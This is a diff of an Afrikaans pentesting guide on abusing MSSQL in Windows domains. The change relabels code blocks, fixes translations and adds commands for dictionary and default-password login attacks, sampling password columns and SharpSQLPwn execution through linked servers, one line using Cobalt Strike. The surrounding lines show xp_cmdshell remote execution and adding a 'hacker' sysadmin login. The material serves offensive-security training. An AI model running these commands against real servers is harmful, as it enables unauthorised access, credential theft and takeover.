@@ -91,11 +91,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ###  Powershell
 
 Die powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
-```powershell
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
 ### Opname vanaf die netwerk sonder domeinsessie
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -109,7 +109,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### Opname van binne die domein
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -130,11 +136,23 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ## MSSQL Basiese Misbruik
 
 ### Toegang tot DB
-```powershell
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -143,8 +161,8 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **opdragte** binne die MSSQL gasheer uit te voer.
-```powershell
+Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer.
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
@@ -156,14 +174,14 @@ Kontroleer in die bladsy genoem in die **volgende afdeling hoe om dit handmatig 
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## MSSQL Vertroude Skakels
+## MSSQL Betroubare Skakels
 
-As 'n MSSQL-instansie vertrou (databasis skakel) deur 'n ander MSSQL-instansie. As die gebruiker bevoegdhede oor die vertroude databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
+As 'n MSSQL-instansie betroubaar (databasis skakel) is deur 'n ander MSSQL-instansie. As die gebruiker bevoegdhede oor die betroubare databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
 
 **Die skakels tussen databasisse werk selfs oor woudvertroue.**
 
 ### Powershell Misbruik
-```powershell
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,6 +212,12 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+'n Ander soortgelyke hulpmiddel wat gebruik kan word, is [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
 Jy kan maklik vir vertroude skakels kyk met metasploit.
@@ -206,11 +230,11 @@ Let wel dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misb
 
 ### Handmatig - Openquery()
 
-Van **Linux** kan jy 'n MSSQL konsole-skal met **sqsh** en **mssqlclient.py** verkry.
+Van **Linux** kan jy 'n MSSQL konsole skulp met **sqsh** en **mssqlclient.py** verkry.
 
 Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
 
-_Registrasie met Windows-verifikasie:_
+_Registrasie met Windows-outeentifikasie:_
 
 ![](<../../images/image (808).png>)
 
@@ -232,7 +256,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-Jy kan hierdie betroubare skakelketting handmatig vir ewig voortset.
+Jy kan hierdie vertroude skakelketting handmatig vir ewig voortset.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -254,7 +278,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "n kliënt na verifikasie te verteenwoordig".
 
-'n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer met 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
+'n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer by 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
 
